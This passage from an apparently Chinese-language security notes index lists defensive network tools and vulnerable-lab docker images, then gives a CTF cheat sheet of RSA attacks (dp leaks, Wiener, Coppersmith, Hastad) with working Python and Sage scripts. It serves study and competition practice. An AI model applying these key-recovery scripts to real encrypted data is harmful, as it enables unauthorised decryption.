the founder and CTO. In 2009, Snort entered InfoWorld\u2019s Open Source Hall of Fame as one of the \u201cgreatest [pieces of] open source software of all time\u201d. Bro \u2013 Bro is a powerful network analysis framework that is much different from the typical IDS you may know. OSSEC \u2013 Comprehensive Open Source HIDS. Not for the faint of heart. Takes a bit to get your head around how it works. Performs log analysis, file integrity checking, policy monitoring, rootkit detection, real-time alerting and active response. It runs on most operating systems, including Linux, MacOS, Solaris, HP-UX, AIX and Windows. Plenty of reasonable documentation. Sweet spot is medium to large deployments. Suricata \u2013 Suricata is a high performance Network IDS, IPS and Network Security Monitoring engine. Open Source and owned by a community run non-profit foundation, the Open Information Security Foundation (OISF). Suricata is developed by the OISF and its supporting vendors. Security Onion \u2013 Security Onion is a Linux distro for intrusion detection, network security monitoring, and log management. It\u2019s based on Ubuntu and contains Snort, Suricata, Bro, OSSEC, Sguil, Squert, Snorby, ELSA, Xplico, NetworkMiner, and many other security tools. The easy-to-use Setup wizard allows you to build an army of distributed sensors for your enterprise in minutes! sshwatch \u2013 IPS for SSH similar to DenyHosts written in Python. It also can gather information about the attacker during the attack in a log. Stealth \u2013 File integrity checker that leaves virtually no sediment. Controller runs from another machine, which makes it hard for an attacker to know that the file system is being checked at defined pseudo random intervals over SSH. Highly recommended for small to medium deployments. AIEngine \u2013 AIEngine is a next-generation interactive/programmable Python/Ruby/Java/Lua packet inspection engine with capabilities of learning without any human intervention, NIDS(Network Intrusion Detection System) functionality, DNS domain classification, network collector, network forensics and many others. Denyhosts \u2013 Thwart SSH dictionary based attacks and brute force attacks. Fail2Ban \u2013 Scans log files and takes action on IPs that show malicious behavior. SSHGuard \u2013 A software to protect services in addition to SSH, written in C Lynis \u2013 an open source security auditing tool for Linux/Unix.","title":"IDS / IPS / Host IDS / Host IPS"},{"location":"other/Most%20Important%20Network%20Penetration%20Testing%20Tools%20for%20Hackers%20%26%20Security%20Professionals/#honey-pot-honey-net","text":"HoneyPy \u2013 HoneyPy is a low to medium interaction honeypot. It is intended to be easy to: deploy, extend functionality with plugins, and apply custom configurations. Dionaea \u2013 Dionaea is meant to be a nepenthes successor, embedding python as scripting language, using libemu to detect shellcodes, supporting ipv6 and tls. Conpot \u2013 ICS/SCADA Honeypot. Conpot is a low interactive server side Industrial Control Systems honeypot designed to be easy to deploy, modify and extend. By providing a range of common industrial control protocols we created the basics to build your own system, capable to emulate complex infrastructures to convince an adversary that he just found a huge industrial complex Amun \u2013 Amun Python-based low-interaction Honeypot. Glastopf \u2013 Glastopf is a Honeypot which emulates thousands of vulnerabilities to gather data from attacks targeting web applications. The principle behind it is very simple: Reply the correct response to the attacker exploiting the web application. Kippo \u2013 Kippo is a medium interaction SSH honeypot designed to log brute force attacks and, most importantly, the entire shell interaction performed by the attacker. Kojoney \u2013 Kojoney is a low level interaction honeypot that emulates an SSH server. The daemon is written in Python using the Twisted Conch libraries. HonSSH \u2013 HonSSH is a high-interaction Honey Pot solution. HonSSH will sit between an attacker and a honey pot, creating two separate SSH connections between them. Bifrozt \u2013 Bifrozt is a NAT device with a DHCP server that is usually deployed with one NIC connected directly to the Internet and one NIC connected to the internal network. What differentiates Bifrozt from other standard NAT devices is its ability to work as a transparent SSHv2 proxy between an attacker and your honeypot. HoneyDrive \u2013 HoneyDrive is the premier honeypot Linux distro. It is a virtual appliance (OVA) with Xubuntu Desktop 12.04.4 LTS edition installed. It contains over 10 pre-installed and pre-configured honeypot software packages such as Kippo SSH honeypot, Dionaea and Amun malware honeypots, Honeyd low-interaction honeypot, Glastopf web honeypot and Wordpot, Conpot SCADA/ICS honeypot, Thug and PhoneyC honeyclients and more. Cuckoo Sandbox \u2013 Cuckoo Sandbox is an Open Source software for automating analysis of suspicious files. To do so it makes use of custom components that monitor the behavior of the malicious processes while running in an isolated environment.","title":"Honey Pot / Honey Net"},{"location":"other/Most%20Important%20Network%20Penetration%20Testing%20Tools%20for%20Hackers%20%26%20Security%20Professionals/#full-packet-capture-forensic","text":"tcpflow \u2013 tcpflow is a program that captures data transmitted as part of TCP connections (flows), and stores the data in a way that is convenient for protocol analysis and debugging. Xplico \u2013 The goal of Xplico is extract from an internet traffic capture the applications data contained. For example, from a pcap file Xplico extracts each email (POP, IMAP, and SMTP protocols), all HTTP contents, each VoIP call (SIP), FTP, TFTP, and so on. Xplico isn\u2019t a network protocol analyzer. Xplico is an open source Network Forensic Analysis Tool (NFAT). Moloch \u2013 Moloch is an open source, large scale IPv4 packet capturing (PCAP), indexing and database system. A simple web interface is provided for PCAP browsing, searching, and exporting. APIs are exposed that allow PCAP data and JSON-formatted session data to be downloaded directly. Simple security is implemented by using HTTPS and HTTP digest password support or by using apache in front. Moloch is not meant to replace IDS engines but instead work along side them to store and index all the network traffic in standard PCAP format, providing fast access. Moloch is built to be deployed across many systems and can scale to handle multiple gigabits/sec of traffic. OpenFPC \u2013 OpenFPC is a set of tools that combine to provide a lightweight full-packet network traffic recorder & buffering system. It\u2019s design goal is to allow non-expert users to deploy a distributed network traffic recorder on COTS hardware while integrating into existing alert and log management tools. Dshell \u2013 Dshell is a network forensic analysis framework. Enables rapid development of plugins to support the dissection of network packet captures. stenographer \u2013 Stenographer is a packet capture solution which aims to quickly spool all packets to disk, then provide simple, fast access to subsets of those packets.","title":"Full Packet Capture / Forensic"},{"location":"other/Most%20Important%20Network%20Penetration%20Testing%20Tools%20for%20Hackers%20%26%20Security%20Professionals/#sniffer-based-network-security-tools","text":"wireshark \u2013 Wireshark is a free and open-source packet analyzer. It is used for network troubleshooting, analysis, software and communications protocol development, and education. Wireshark is very similar to tcpdump, but has a graphical front-end, plus some integrated sorting and filtering options. netsniff-ng \u2013 netsniff-ng is a free Linux networking toolkit, a Swiss army knife for your daily Linux network plumbing if you will. Its gain of performance is reached by zero-copy mechanisms, so that on packet reception and transmission the kernel does not need to copy packets from kernel space to user space and vice versa. Live HTTP headers \u2013 Live HTTP headers is a free firefox addon to see your browser requests in real time. It shows the entire headers of the requests and can be used to find the security loopholes in implementations.","title":"Sniffer based Network Security Tools"},{"location":"other/Most%20Important%20Network%20Penetration%20Testing%20Tools%20for%20Hackers%20%26%20Security%20Professionals/#siem-network-security-tools","text":"Prelude \u2013 Prelude is a Universal \u201cSecurity Information & Event Management\u201d (SIEM) system. Prelude collects, normalizes, sorts, aggregates, correlates and reports all security-related events independently of the product brand or license giving rise to such events; Prelude is \u201cagentless\u201d. OSSIM \u2013 OSSIM provides all of the features that a security professional needs from a SIEM offering \u2013 event collection, normalization, and correlation. FIR \u2013 Fast Incident Response, a cybersecurity incident management platform.","title":"SIEM \u2013 Network Security Tools"},{"location":"other/Most%20Important%20Network%20Penetration%20Testing%20Tools%20for%20Hackers%20%26%20Security%20Professionals/#vpn","text":"OpenVPN \u2013 OpenVPN is an open source software application that implements virtual private network (VPN) techniques for creating secure point-to-point or site-to-site connections in routed or bridged configurations and remote access facilities. It uses a custom security protocol that utilizes SSL/TLS for key exchange.","title":"VPN"},{"location":"other/Most%20Important%20Network%20Penetration%20Testing%20Tools%20for%20Hackers%20%26%20Security%20Professionals/#fast-packet-processing","text":"DPDK \u2013 DPDK is a set of libraries and drivers for fast packet processing. PFQ \u2013 PFQ is a functional networking framework designed for the Linux operating system that allows efficient packets capture/transmission (10G and beyond), in-kernel functional processing and packets steering across sockets/end-points. PF_RING \u2013 PF_RING is a new type of network socket that dramatically improves the packet capture speed. PF_RING ZC (Zero Copy) \u2013 PF_RING ZC (Zero Copy) is a flexible packet processing framework that allows you to achieve 1/10 Gbit line rate packet processing (both RX and TX) at any packet size. It implements zero copy operations including patterns for inter-process and inter-VM (KVM) communications. PACKET_MMAP/TPACKET/AF_PACKET \u2013 It\u2019s fine to use PACKET_MMAP to improve the performance of the capture and transmission process in Linux. netmap \u2013 netmap is a framework for high speed packet I/O. Together with its companion VALE software switch, it is implemented as a single kernel module and available for FreeBSD, Linux and now also Windows.","title":"Fast Packet Processing"},{"location":"other/Most%20Important%20Network%20Penetration%20Testing%20Tools%20for%20Hackers%20%26%20Security%20Professionals/#firewall-based-network-security-tools","text":"pfSense \u2013 Firewall and Router FreeBSD distribution. OPNsense \u2013 is an open source, easy-to-use and easy-to-build FreeBSD based firewall and routing platform. OPNsense includes most of the features available in expensive commercial firewalls, and more in many cases. It brings the rich feature set of commercial offerings with the benefits of open and verifiable sources. fwknop \u2013 Protects ports via Single Packet Authorization in your firewall.","title":"Firewall based Network Security Tools"},{"location":"other/Most%20Important%20Network%20Penetration%20Testing%20Tools%20for%20Hackers%20%26%20Security%20Professionals/#anti-spam","text":"SpamAssassin \u2013 A powerful and popular email spam filter employing a variety of detection technique.","title":"Anti-Spam"},{"location":"other/Most%20Important%20Network%20Penetration%20Testing%20Tools%20for%20Hackers%20%26%20Security%20Professionals/#docker-images-for-penetration-testing-security","text":"docker pull kalilinux/kali-linux-docker official Kali Linux docker pull owasp/zap2docker-stable \u2013 official OWASP ZAP docker pull wpscanteam/wpscan \u2013 official WPScan docker pull remnux/metasploit \u2013 docker-metasploit docker pull citizenstig/dvwa \u2013 Damn Vulnerable Web Application (DVWA) docker pull wpscanteam/vulnerablewordpress \u2013 Vulnerable WordPress Installation docker pull hmlio/vaas-cve-2014-6271 \u2013 Vulnerability as a service: Shellshock docker pull hmlio/vaas-cve-2014-0160 \u2013 Vulnerability as a service: Heartbleed docker pull opendns/security-ninjas \u2013 Security Ninjas docker pull diogomonica/docker-bench-security \u2013 Docker Bench for Security docker pull ismisepaul/securityshepherd \u2013 OWASP Security Shepherd docker pull danmx/docker-owasp-webgoat \u2013 OWASP WebGoat Project docker image docker-compose build && docker-compose up \u2013 OWASP NodeGoat docker pull citizenstig/nowasp \u2013 OWASP Mutillidae II Web Pen-Test Practice Application You can follow us on Linkedin , Twitter , Facebook for daily Cybersecurity updates also you can take the Best Cybersecurity courses online to keep your self-updated. \u539f\u6587\u94fe\u63a5\uff1a https://gbhackers.com/network-security-tools/","title":"Docker Images for Penetration Testing &amp; Security"},{"location":"other/RSA/","text":".mjx-block { text-align: left; display: inline-block; } .mjx-chtml { display: inline-block; text-align: left; font-size: 80%; background-color: lightgrey; } MathJax.Hub.Config({ \"HTML-CSS\": { linebreaks: { automatic: true } }, SVG: { linebreaks: { automatic: true } } }); \u5e38\u7528\u5de5\u5177 \u5206\u89e3\u5927\u7d20\u6570 factordb \uff08 http://www.factordb.com \uff09 yafu \uff08p,q\u76f8\u5dee\u8fc7\u5927\u6216\u8fc7\u5c0fyafu\u53ef\u5206\u89e3\u6210\u529f\uff09 sage \uff08 divisors(n) \uff09\uff08\u5c0f\u7d20\u6570\uff09 Pollard\u2019s p\u22121 \uff08 python -m primefac -vs -m=p-1 xxxxxxx \uff09\uff08\u5149\u6ed1\u6570\uff09 Williams\u2019s p+1 \uff08 python -m primefac -vs -m=p+1 xxxxxxx \uff09\uff08\u5149\u6ed1\u6570\uff09 \u5728\u7ebf sage \u73af\u5883\uff1a https://sagecell.sagemath.org/ Openssl \u89e3\u6790\u52a0\u5bc6\u5bc6\u94a5\uff1a openssl rsa -pubin -text -modulus -in pub.key \u751f\u6210\u89e3\u5bc6\u5bc6\u94a5\uff1a python rsatool.py -f PEM -o key.key -p 1 -q 1 -e 1 openssl rsautl -decrypt -inkey key.pem -in flag.enc -out flag openssl rsautl -decrypt -oaep -inkey key.pem -in flag.enc -out flag \uff08OAEP\u65b9\u5f0f\uff09 \u811a\u672c\u751f\u6210\u89e3\u5bc6\u5bc6\u94a5\uff1a # coding=utf-8 import math import sys from Crypto.PublicKey import RSA keypair = RSA.generate(1024) keypair.p = keypair.q = keypair.e = keypair.n = keypair.p * keypair.q Qn = long((keypair.p - 1) * (keypair.q - 1)) i = 1 while (True): x = (Qn * i) + 1 if (x % keypair.e == 0): keypair.d = x / keypair.e break i += 1 private = open('private.pem', 'w') private.write(keypair.exportKey()) private.close() \u811a\u672c\u96c6 + <https://github.com/Ganapati/RsaCtfTool> #\u7528\u6cd5\u4e00\uff1a\u5df2\u77e5\u516c\u94a5(\u81ea\u52a8\u6c42\u79c1\u94a5) $ python3 RsaCtfTool.py --publickey \u516c\u94a5\u6587\u4ef6 --uncipherfile \u52a0\u5bc6\u6587\u4ef6 #\u7528\u6cd5\u4e8c\uff1a\u5df2\u77e5\u516c\u94a5\u6c42\u79c1\u94a5 $ python3 RsaCtfTool.py --publickey \u516c\u94a5\u6587\u4ef6 --private #\u7528\u6cd5\u4e09\uff1a\u5bc6\u94a5\u683c\u5f0f\u8f6c\u6362 #\u628aPEM\u683c\u5f0f\u7684\u516c\u94a5\u8f6c\u6362\u4e3an\uff0ce $ python3 RsaCtfTool.py --dumpkey --key \u516c\u94a5\u6587\u4ef6 #\u628an,e\u8f6c\u6362\u4e3aPEM\u683c\u5f0f $ python3 RsaCtfTool.py --createpub -n 782837482376192871287312987398172312837182 -e 65537 + https://github.com/yifeng-lee/RSA-In-CTF + https://github.com/ValarDragon/CTF-Crypto \u200b \u5e38\u89c1\u7c7b\u578b \u7ed9p,q,e,c import gmpy2 as gp import binascii p = q = e = c = n = p*q phi = (p-1)*(q-1) d = gp.invert(e,phi) m = pow(c,d,n) print(m) print(bytes.fromhex(hex(m)[2:])) \u200b \u7ed9n,e,dp,c $$dp\\equiv d \\pmod {(p-1)}$$ $$\\because dp\\cdot e\\equiv d\\cdot e\\equiv 1 \\pmod {(p-1)}$$ $$\\therefore dp\\cdot e-1=k\\cdot (p-1)$$ $$\\therefore (dp\\cdot e-1)\\cdot d\\cdot e=k\u2019\\cdot (p-1),\\quad k\u2019=k\\cdot d\\cdot e \\ \\Leftrightarrow d\\cdot e=-k\u2019\\cdot (p-1)+dp\\cdot e\\cdot d\\cdot e\\equiv 1 \\pmod{\\varphi(n)} \\ \\Leftrightarrow -k\u2019\\cdot (p-1)+dp\\cdot e\\equiv 1\\pmod{\\varphi(n)}$$ $$\\therefore k_{1}\\cdot (p-1)+dp\\cdot e-1=k_{2}\\cdot (p-1)\\cdot (q-1) \\ \\Leftrightarrow (p-1)\\cdot (k_{2}\\cdot (q-1)-k_{1})+1=dp\\cdot e$$ $$\\because dp<p-1\\quad \\therefore (k_{2}\\cdot (q-1)-k_{1})\\in (0, e)$$ $$\\therefore$$ \u904d\u5386 $$(1, e)$$\uff0c\u5f53\u540c\u65f6\u6ee1\u8db3 $$(dp\\cdot e-1)\\bmod i==0$$ \u548c $$n\\bmod((dp\\cdot e-1)//i+1)==0$$ \u65f6\uff0c$$N$$ \u6210\u529f\u5206\u89e3\u3002 import gmpy2 as gp e = n = dp = c = for x in range(1, e): if(e*dp%x==1): p=(e*dp-1)//x+1 if(n%p!=0): continue q=n//p phin=(p-1)*(q-1) d=gp.invert(e, phin) m=gp.powmod(c, d, n) if(len(hex(m)[2:])%2==1): continue print('--------------') print(m) print(hex(m)[2:]) print(bytes.fromhex(hex(m)[2:])) \u53d8\u79cd1\uff1a \u7ed9 $$p,e,d_p,c,b$$\uff0c\u5176\u4e2d $$n=p^bq$$\u3002 Hensel lifting for Takagi\u2019s scheme \uff08p.189\uff09\uff1a from Crypto.Util.number import * import gmpy2 p = dp = c = b = e = mp1 = pow(c, dp, p) mp = pow(c, dp - 1, p) for i in range(1, b - 2): x = pow(c - pow(mp1, e), 1, p**(i + 1)) y = pow(x * mp * (gmpy2.invert(e, p)), 1, p**(i + 1)) mp1 = mp1 + y print(long_to_bytes(mp1)) \u53d8\u79cd2 \uff1a\u7ed9 $$n,e,dp_0,c,k$$\uff0c\u5176\u4e2d $$dp_0$$ \u4e3a $$dp$$ \u9ad8 $$(n\\text{bits}-k)$$ \u4f4d\uff0c\u5373 $$dp_0=dp>>k$$\u3002 \uff08Coppersmith\u653b\u51fb\uff0c\u5df2\u77e5dp\u9ad8\u4f4d\u653b\u51fb\uff09 $$e\\cdot dp \\equiv e\\cdot d\\equiv 1 \\pmod {(p-1)} \\ \\Leftrightarrow e \\cdot dp=k(p-1)+1=kp-k+1 \\ \\Leftrightarrow e\\cdot dp+k-1 \\equiv 0 \\pmod p$$ $$\\because dp<p-1$$\uff0c$$\\therefore k<e$$ $$\\therefore e\\cdot (dp_0<<k+x)+k-1 \\equiv 0 \\pmod p$$ #Sage dp0 = e = n = F.<x> = PolynomialRing(Zmod(n)) d = inverse_mod(e, n) for k in range(1, e): f = (secret << 200) + x + (k - 1) * d x0 = f.small_roots(X=2 ** (200 + 1), beta=0.44, epsilon=1/32) if len(x0) != 0: dp = x0[0] + (secret << 200) for i in range(2, e): p = (e * Integer(dp) - 1 + i) // i if n % p == 0: break if p < 0: continue else: print('k = ',k) print('p = ',p) print('dp = ',dp) break * \u53d8\u79cd3 \uff1a\u7ed9 $$n,e,dp,c$$\u200b\u200b\uff0c\u5176\u4e2d $$dp$$\u200b\u200b\u200b \u5f88\u5c0f\uff0c$$e$$ \u5f88\u5927\u3002 \u679a\u4e3e $$dp$$\uff0c\u56e0 $$e\\cdot dp \\equiv 1 \\pmod {(p-1)}$$\uff0c\u53c8\u7531\u8d39\u9a6c\u5c0f\u5b9a\u7406\uff0c\u5bf9\u4efb\u610f $$r$$\uff0c\u6709 $$m^{e \\cdot dp}\\equiv m \\pmod p$$\uff0c\u5373 $$p \\mid (m^{e \\cdot dp}-m)$$\uff1b \u53c8 $$p \\mid n$$\uff0c\u5f88\u5927\u6982\u7387 $$p=\\gcd(m^{e \\cdot dp}-m,n)$$\u3002 \u200b \u7ed9p,q,dp,dq,c $$dp=d \\bmod (p-1)$$\uff0c$$dq=d \\bmod (q-1)$$ $$\\because d=k_{1}(p-1)+dp=k_{2}(q-1)+dq \\ \\Leftrightarrow k_{1}(p-1)=(dq-dp)+k_{2}(q-1) \\ \\Leftrightarrow k_{1}\\frac{p-1}{\\gcd(p-1,q-1)}=\\frac{dq-dp}{\\gcd(p-1,q-1)}+k_{2}\\frac{q-1}{\\gcd(p-1,q-1)} \\ \\Rightarrow k_{1}\\frac{p-1}{\\gcd(p-1,q-1)}\\equiv\\frac{dq-dp}{\\gcd(p-1,q-1)} \\pmod {\\frac{q-1}{\\gcd(p-1,q-1)}} \\ \\Leftrightarrow k_{1}\\equiv \\text{inv}(\\frac{p-1}{\\gcd(p-1,q-1)},\\frac{q-1}{\\gcd(p-1,q-1)})\\cdot \\frac{dq-dp}{\\gcd(p-1,q-1)} \\pmod {\\frac{q-1}{\\gcd(p-1,q-1)}}$$ \u5c06 $$k_{1}=k_{3}\\frac{q-1}{\\gcd(p-1,q-1)}+\\text{inv}(\\frac{p-1}{\\gcd(p-1,q-1)},\\frac{q-1}{\\gcd(p-1,q-1)})\\cdot \\frac{dq-dp}{\\gcd(p-1,q-1)}$$ \u4ee3\u5165 $$d=k_{1}(p-1)+dp$$ $$d=k_{3}\\frac{(p-1)(q-1)}{\\gcd(p-1,q-1)}+\\text{inv}(\\frac{p-1}{\\gcd(p-1,q-1)},\\frac{q-1}{\\gcd(p-1,q-1)})\\cdot \\frac{(dq-dp)(p-1)}{\\gcd(p-1,q-1)}+dp \\ \\Rightarrow d\\equiv \\text{inv}(\\frac{p-1}{\\gcd(p-1,q-1)},\\frac{q-1}{\\gcd(p-1,q-1)})\\cdot \\frac{(dq-dp)(p-1)}{\\gcd(p-1,q-1)}+dp \\pmod{\\frac{(p-1)(q-1)}{\\gcd(p-1,q-1)}}$$ import gmpy2 as gp p = q = dp = dq = c = n = p*q phin = (p-1)*(q-1) dd = gp.gcd(p-1, q-1) d=(dp-dq)//dd * gp.invert((q-1)//dd, (p-1)//dd) * (q-1) +dq print(d) m = gp.powmod(c, d, n) print('-------------------') print(m) print(hex(m)[2:]) print(bytes.fromhex(hex(m)[2:])) \u200b \u4f4e\u89e3\u5bc6\u6307\u6570\u653b\u51fb/\u4f4e\u79c1\u94a5\u6307\u6570\u653b\u51fb\uff08e\u957f\u5ea6\u8f83\u5927\uff0cd\u5c0f\uff0cWiener Attack\uff09 \u9002\u7528\u60c5\u51b5\uff1a\u5df2\u77e5 $$N,e$$\uff0c\u4e14 $$e$$ \u8fc7\u5927\u6216\u8fc7\u5c0f\u3002 $$\\varphi(n) = (p-1)(q-1)=pq - (p + q) + 1=N - (p + q) + 1$$ $$\\because p, q$$ \u975e\u5e38\u5927\uff0c$$\\therefore\\,pq\\gg p+q$$\uff0c $$\\therefore\\varphi(n)\\approx N$$ $$\\because ed\\equiv1\\,mod\\,\\varphi(n)$$\uff0c$$\\therefore ed-1=k\\varphi(n)$$\uff0c\u8fd9\u4e2a\u5f0f\u5b50\u4e24\u8fb9\u540c\u9664 $$d\\varphi(n)$$ \u53ef\u5f97\uff1a $$\\cfrac{e}{\\varphi(n)}-\\cfrac{k}{d}=\\cfrac{1}{d\\varphi(n)}$$ $$\\because \\varphi(n)\\approx N$$\uff0c$$\\therefore \\cfrac{e}{N}-\\cfrac{k}{d}=\\cfrac{1}{d\\varphi(n)}$$\uff0c\u540c\u6837 $$d\\varphi(n)$$ \u662f\u4e00\u4e2a\u5f88\u5927\u7684\u6570\uff0c\u6240\u4ee5 $$\\cfrac{e}{N}$$ \u7565\u5927\u4e8e $$\\cfrac{k}{d}$$ \u56e0\u4e3a $$e$$ \u548c $$N$$ \u662f\u77e5\u9053\u7684\uff0c\u6240\u4ee5\u8ba1\u7b97\u51fa $$\\cfrac{e}{N}$$ \u540e\uff0c\u6bd4\u5b83\u7565\u5c0f\u7684 $$\\cfrac{k}{d}$$ \uff0c\u53ef\u4ee5\u901a\u8fc7\u8ba1\u7b97 $$\\cfrac{e}{N}$$ \u7684\u8fde\u5206\u6570\u5c55\u5f00\uff0c\u4f9d\u6b21\u7b97\u51fa\u8fd9\u4e2a\u5206\u6570\u6bcf\u4e00\u4e2a\u6e10\u8fdb\u5206\u6570\uff0c\u7531\u4e8e $$\\cfrac{e}{N}$$ \u7565\u5927\u4e8e $$\\cfrac{k}{d}$$\uff0cWiener \u8bc1\u660e\u4e86\uff0c\u8be5\u653b\u51fb\u80fd\u7cbe\u786e\u7684\u8986\u76d6 $$\\cfrac{k}{d}$$\u3002 \u5728 $$e$$ \u8fc7\u5927\u6216\u8fc7\u5c0f\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4f7f\u7528\u7b97\u6cd5\u4ece $$e$$ \u4e2d\u5feb\u901f\u63a8\u65ad\u51fa $$d$$ \u7684\u503c\u3002\u53ef\u4ee5\u89e3\u51b3 $$q<p<2q,d<\\cfrac{1}{3}N^{\\frac{1}{4}}$$ \u7684\u95ee\u9898\u3002 RSAWienerHacker\u5de5\u5177\uff1a https://github.com/pablocelayes/rsa-wiener-attack #\u811a\u672c1\uff08\u5e26\u5de5\u5177\uff09 #python2 import RSAwienerHacker n = e = d = RSAwienerHacker.hack_RSA(e,n) if d: print(d) import hashlib flag = \"flag{\" + hashlib.md5(hex(d)).hexdigest() + \"}\" print flag #\u811a\u672c2 #sage def rational_to_contfrac(x,y): # Converts a rational x/y fraction into a list of partial quotients [a0, ..., an] a = x // y pquotients = [a] while a * y != x: x, y = y, x - a * y a = x // y pquotients.append(a) return pquotients def convergents_from_contfrac(frac): # computes the list of convergents using the list of partial quotients convs = []; for i in range(len(frac)): convs.append(contfrac_to_rational(frac[0 : i])) return convs def contfrac_to_rational (frac): # Converts a finite continued fraction [a0, ..., an] to an x/y rational. if len(frac) == 0: return (0,1) num = frac[-1] denom = 1 for _ in range(-2, -len(frac) - 1, -1): num, denom = frac[_] * num + denom, num return (num, denom) n = e = c = def egcd(a, b): if a == 0: return (b, 0, 1) g, x, y = egcd(b % a, a) return (g, y - (b // a) * x, x) def mod_inv(a, m): g, x, _ = egcd(a, m) return (x + m) % m def isqrt(n): x = n y = (x + 1) // 2 while y < x: x = y y = (x + n // x) // 2 return x def crack_rsa(e, n): frac = rational_to_contfrac(e, n) convergents = convergents_from_contfrac(frac) for (k, d) in convergents: if k != 0 and (e * d - 1) % k == 0: phi = (e * d - 1) // k s = n - phi + 1 # check if x*x - s*x + n = 0 has integer roots D = s * s - 4 * n if D >= 0: sq = isqrt(D) if sq * sq == D and (s + sq) % 2 == 0: return d d = crack_rsa(e, n) m = hex(pow(c, d, n))[2:] print(bytes.fromhex(m)) #\u811a\u672c3 from Crypto.Util.number import long_to_bytes e = n = c = #\u5c06\u5206\u6570x/y\u5c55\u5f00\u4e3a\u8fde\u5206\u6570\u7684\u5f62\u5f0f def transform(x,y): arr=[] while y: arr+=[x//y] x,y=y,x%y return arr #\u6c42\u89e3\u6e10\u8fdb\u5206\u6570 def sub_fraction(k): x=0 y=1 for i in k[::-1]: x,y=y,x+i*y return (y,x) data=transform(e,n) for x in range(1,len(data)+1): data1=data[:x] d = sub_fraction(data1)[1] m = pow(c,d,n) flag = long_to_bytes(m) if b'flag{' in flag: print(flag) break \u53d8\u79cd1 \uff1a$$\\cfrac{N_1}{N_2}<\\cfrac{q_1}{q_2}<1$$ \u53c2\u8003\uff1a 2020\u5e74\u7f8a\u57ce\u676f - RRRRRRRSA Paper: https://eprint.iacr.org/2015/399.pdf \u5c1d\u8bd5\u5bf9 $$\\cfrac{N_1}{N_2}$$ \u8fdb\u884c\u8fde\u5206\u6570\u5c55\u5f00\u5e76\u6c42\u5176\u5404\u9879\u6e10\u8fdb\u5206\u6570\uff0c\u8bb0\u4e3a $$\\cfrac{t_i}{s_i}$$ \u5e76\u9a8c\u8bc1 $$N_1\\% {t_k}==0$$ \u662f\u5426\u6210\u7acb\uff0c\u5982\u679c\u6210\u7acb\uff0c\u90a3\u4e48 $$q_1=t_k\uff0cq_2=s_k$$\u3002 \u8fde\u5206\u6570\u903c\u8fd1 \uff1a def transform(x,y): #\u4f7f\u7528\u8f97\u8f6c\u76f8\u9664\u5c06\u5206\u6570x/y\u8f6c\u4e3a\u8fde\u5206\u6570\u7684\u5f62\u5f0f res=[] while y: res.append(x//y) x,y=y,x%y return res def continued_fraction(sub_res): numerator,denominator=1,0 for i in sub_res[::-1]: #\u4ecesublist\u7684\u540e\u9762\u5f80\u524d\u5faa\u73af denominator,numerator=numerator,i*numerator+denominator return denominator,numerator #\u5f97\u5230\u6e10\u8fdb\u5206\u6570\u7684\u5206\u6bcd\u548c\u5206\u5b50\uff0c\u5e76\u8fd4\u56de #\u6c42\u89e3\u6bcf\u4e2a\u6e10\u8fdb\u5206\u6570 def sub_fraction(x,y): res=transform(x,y) res=list(map(continued_fraction,(res[0:i] for i in range(1,len(res))))) #\u5c06\u8fde\u5206\u6570\u7684\u7ed3\u679c\u9010\u4e00\u622a\u53d6\u4ee5\u6c42\u6e10\u8fdb\u5206\u6570 return res def wienerAttack(n1,n2): for (q2,q1) in sub_fraction(n1,n2): #\u7528\u4e00\u4e2afor\u5faa\u73af\u6765\u6ce8\u610f\u8bd5\u63a2n1/n2\u7684\u8fde\u7eed\u51fd\u6570\u7684\u6e10\u8fdb\u5206\u6570\uff0c\u76f4\u5230\u627e\u5230\u4e00\u4e2a\u6ee1\u8db3\u6761\u4ef6\u7684\u6e10\u8fdb\u5206\u6570 if q1==0: #\u53ef\u80fd\u4f1a\u51fa\u73b0\u8fde\u5206\u6570\u7684\u7b2c\u4e00\u4e2a\u4e3a0\u7684\u60c5\u51b5\uff0c\u6392\u9664 continue if n1%q1==0 and q1!=1: #\u6210\u7acb\u6761\u4ef6 return (q1,q2) print(\"\u8be5\u65b9\u6cd5\u4e0d\u9002\u7528\") N1=60143104944034567859993561862949071559877219267755259679749062284763163484947626697494729046430386559610613113754453726683312513915610558734802079868190554644983911078936369464590301246394586190666760362763580192139772729890492729488892169933099057105842090125200369295070365451134781912223048179092058016446222199742919885472867511334714233086339832790286482634562102936600597781342756061479024744312357407750731307860842457299116947352106025529309727703385914891200109853084742321655388368371397596144557614128458065859276522963419738435137978069417053712567764148183279165963454266011754149684758060746773409666706463583389316772088889398359242197165140562147489286818190852679930372669254697353483887004105934649944725189954685412228899457155711301864163839538810653626724347 N2=60143104944034567859993561862949071559877219267755259679749062284763163484947626697494729046430386559610613113754453726683312513915610558734802079868195633647431732875392121458684331843306730889424418620069322578265236351407591029338519809538995249896905137642342435659572917714183543305243715664380787797562011006398730320980994747939791561885622949912698246701769321430325902912003041678774440704056597862093530981040696872522868921139041247362592257285423948870944137019745161211585845927019259709501237550818918272189606436413992759328318871765171844153527424347985462767028135376552302463861324408178183842139330244906606776359050482977256728910278687996106152971028878653123533559760167711270265171441623056873903669918694259043580017081671349232051870716493557434517579121 print(wienerAttack(N1,N2)) \u200b \u4f4e\u52a0\u5bc6\u6307\u6570\u5e7f\u64ad\u653b\u51fb\uff08Hastad\u653b\u51fb\uff09 \u9002\u7528\u60c5\u51b5\uff1a $$n,c$$ \u4e0d\u540c\uff0c$$m,e$$ \u76f8\u540c\u3002\u4e00\u822c\u4f1a\u662f $$e=k$$\uff0c\u7136\u540e\u7ed9 $$k$$ \u7ec4\u6570\u636e\u3002 \u5982\u679c\u4e00\u4e2a\u7528\u6237\u4f7f\u7528\u540c\u4e00\u4e2a\u52a0\u5bc6\u6307\u6570 e \u52a0\u5bc6\u4e86\u540c\u4e00\u4e2a\u5bc6\u6587\uff0c\u5e76\u53d1\u9001\u7ed9\u4e86\u5176\u4ed6 e \u4e2a\u7528\u6237\u3002\u90a3\u4e48\u5c31\u4f1a\u4ea7\u751f\u5e7f\u64ad\u653b\u51fb\u3002\u8fd9\u4e00\u653b\u51fb\u7531 H\u00e5stad \u63d0\u51fa\u3002 \u4f7f\u7528\u4e0d\u540c\u7684\u6a21\u6570 $$n$$\uff0c\u76f8\u540c\u7684\u516c\u94a5\u6307\u6570 $$e$$ \u52a0\u5bc6\u76f8\u540c\u7684\u4fe1\u606f\uff0c\u5c31\u4f1a\u5f97\u5230\u591a\u4e2a $$m^e \\equiv c_i \\pmod {n_i}$$\uff0c\u5c06 $$m^e$$ 